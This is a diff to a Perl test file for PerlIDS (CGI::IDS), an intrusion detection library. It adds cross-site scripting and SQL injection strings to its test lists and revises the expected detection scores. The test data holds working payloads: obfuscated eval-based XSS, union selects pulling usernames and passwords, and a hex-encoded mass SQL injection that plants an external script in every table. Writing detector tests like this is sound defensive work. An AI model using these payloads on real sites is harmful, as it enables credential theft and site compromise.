@@ -3,7 +3,7 @@
 #   01_ids.t
 # DESCRIPTION
 #   Tests for PerlIDS (CGI::IDS)
-#   based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1228
+#   based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1274
 # AUTHOR
 #   Hinnerk Altenburg <hinnerk@cpan.org>
 # CREATION DATE
@@ -325,6 +325,8 @@ my %testConcatenatedXSSList2 = (
                         undefined,undefined
                         undefined,undefined',
         31 => 'location.assign(1?name+1:(x))',
+        32 => "this[('eva')+new Array + 'l'](/x.x.x/+name+/x.x/)",
+        33 => "this[[],('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+name,new Array)",
 );
 
 my %testXMLPredicateXSSList = (
@@ -393,6 +395,15 @@ my %testXSSList = (
 	27  => "document.createStyleSheet('http://businessinfo.co.uk/labs/xss/xss.css')",
 	28  => 'document.body.style.cssText=name',
 	29  => "for(i=0;;)i",
+	30  => "stop.sdfgkldfsgsdfgsdfgdsfg in alert(1)",
+	31  => "this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        aaaaaaaaaaaaaaaa :-(alert||foo)(1)||foo",
+	32  => "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)",
+	33  => '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>',
 );
 
 my %testSelfContainedXSSList = (
@@ -677,6 +688,17 @@ my %testSQLIList6 = (
 	7 => "'DECLARE%20\@S%20CHAR(4000);SET%20\@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(\@S);';",
 	8 => "asaa';SELECT[asd]FROM[asd]",
 	9 => "asd'; select [column] from users ",
+	10 => "0x31 union select @"."@"."version,username,password from users ",
+	11 => "1 order by if(1<2 ,uname,uid) ",
+	12 => "1 order by ifnull(null,userid) ",
+	13 => "2' between 1 and 3 or 0x61 like 'a",
+	14 => "4' MOD 2 like '0",
+	15 => "-1' /ID having 1< 1 and 1 like 1/'1 ",
+	16 => "2' / 0x62 or 0 like binary '0",
+	17 => "0' between 2-1 and 4-1 or 1 sounds like binary '1 ",
+	18 => "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ",
+	19 => "-1' or substring(null/null,1/null,1) or '1",
+	20 => "1' and 1 = hex(null-1 or 1) or 1 /'null ",
 );
 
 my %testDTList = (
@@ -842,7 +864,7 @@ my %testForFalseAlerts = (
     9 => 'Big fun! ;-) :-D :))) ;)',
    10 => '"hi" said the mouse to the cat and \'showed off\' her options',
    11 => 'eZtwEI9v7nI1mV4Baw502qOhmGZ6WJ0ULN1ufGmwN5j+k3L6MaI0Hv4+RlOo42rC0KfrwUUm5zXOfy9Gka63m02fdsSp52nhK0Jsniw2UgeedUvn0SXfNQc/z13/6mVkcv7uVN63o5J8xzK4inQ1raknqYEwBHvBI8WGyJ0WKBMZQ26Nakm963jRb18Rzv6hz1nlf9cAOH49EMiD4vzd1g==',
-   12 => 'Reservist, Status: Stabsoffizier',
+   12 => "'Reservist, Status: Stabsoffizier'",
    13 => '"European Business School (ebs)"',
    14 => 'Universität Karlsruhe (TH)',
    15 => 'Psychologie, Coaching und Training, Wissenserlangung von Führungskräften, Menschen bewegen, Direktansprache, Erfolg, Spaß, Positiv Thinking and Feeling, Natur, Kontakte pflegen, Face to Face Contact, Sport/Fitness (Fussball, Beachvolleyball, Schwimmen, Laufen, Krafttraining, Bewegungsübungen uvm.), Wellness & Beauty',
@@ -851,6 +873,7 @@ my %testForFalseAlerts = (
    18 => 'exchange of experience in (project) management and leadership • always interested in starting up business and teams • people with a passion • new and lost international contacts',
    19 => 'Highly mobile (Project locations: Europe & Asia), You are a team player',
    20 => '"Philippine Women\'s University (Honours)"',
+   21 => ')))) да второй состав в отличной форме, не оставили парням ни единого шанса!!! Я думаю нас jedi, можно в первый переводить ))) ',
 );
 
 #------------------------- Tests -----------------------------------------------
@@ -962,28 +985,28 @@ is ($ids->detect_attacks(request => \%testWhitelistSkip3),					8,			"testWhiteli
 
 # test converters and filters
 print testmessage("test converters and filters");
-is ($ids->detect_attacks(request => \%testAttributeBreakerList),			43,			"testAttributeBreakerList");
+is ($ids->detect_attacks(request => \%testAttributeBreakerList),			29,			"testAttributeBreakerList");
 is ($ids->detect_attacks(request => \%testCommentList),						9,			"testCommentList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1120,		"testConcatenatedXSSList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			825,		"testConcatenatedXSSList2");
-is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),				143,		"testXMLPredicateXSSList");
-is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),	68,			"testXMLPredicateXSSList");
-is ($ids->detect_attacks(request => \%testXSSList),							493,		"testXSSList");
-is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			500,		"testSelfContainedXSSList");
-is ($ids->detect_attacks(request => \%testSQLIList),						485,		"testSQLIList");
-is ($ids->detect_attacks(request => \%testSQLIList2),						586,		"testSQLIList2");
-is ($ids->detect_attacks(request => \%testSQLIList3),						597,		"testSQLIList3");
-is ($ids->detect_attacks(request => \%testSQLIList4),						768,		"testSQLIList4");
-is ($ids->detect_attacks(request => \%testSQLIList5),						859,		"testSQLIList5");
-is ($ids->detect_attacks(request => \%testSQLIList6),						206,		"testSQLIList6");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1106,		"testConcatenatedXSSList");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			871,		"testConcatenatedXSSList2");
+is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),				154,		"testXMLPredicateXSSList");
+is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),	87,			"testXMLPredicateXSSList");
+is ($ids->detect_attacks(request => \%testXSSList),							563,		"testXSSList");
+is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			479,		"testSelfContainedXSSList");
+is ($ids->detect_attacks(request => \%testSQLIList),						465,		"testSQLIList");
+is ($ids->detect_attacks(request => \%testSQLIList2),						604,		"testSQLIList2");
+is ($ids->detect_attacks(request => \%testSQLIList3),						612,		"testSQLIList3");
+is ($ids->detect_attacks(request => \%testSQLIList4),						747,		"testSQLIList4");
+is ($ids->detect_attacks(request => \%testSQLIList5),						920,		"testSQLIList5");
+is ($ids->detect_attacks(request => \%testSQLIList6),						335,		"testSQLIList6");
 is ($ids->detect_attacks(request => \%testDTList),							121,		"testDTList");
-is ($ids->detect_attacks(request => \%testURIList),							126,		"testURIList");
-is ($ids->detect_attacks(request => \%testRFEList),							495,		"testRFEList");
-is ($ids->detect_attacks(request => \%testUTF7List),						78,			"testUTF7List");
+is ($ids->detect_attacks(request => \%testURIList),							131,		"testURIList");
+is ($ids->detect_attacks(request => \%testRFEList),							512,		"testRFEList");
+is ($ids->detect_attacks(request => \%testUTF7List),						71,			"testUTF7List");
 is ($ids->detect_attacks(request => \%testBase64CCConverter),				95,			"testBase64CCConverter");
 is ($ids->detect_attacks(request => \%testDecimalCCConverter),				67,			"testDecimalCCConverter");
 is ($ids->detect_attacks(request => \%testOctalCCConverter),				48,			"testOctalCCConverter");
-is ($ids->detect_attacks(request => \%testHexCCConverter),					120,		"testHexCCConverter");
+is ($ids->detect_attacks(request => \%testHexCCConverter),					106,		"testHexCCConverter");
 is ($ids->detect_attacks(request => \%testLDAPInjectionList),				20,			"testLDAPInjectionList");
 is ($ids->detect_attacks(request => \%testJSONScanning),					32,			"testJSONScanning");
 is ($ids->detect_attacks(request => \%testForFalseAlerts),					0,			"testForFalseAlerts");
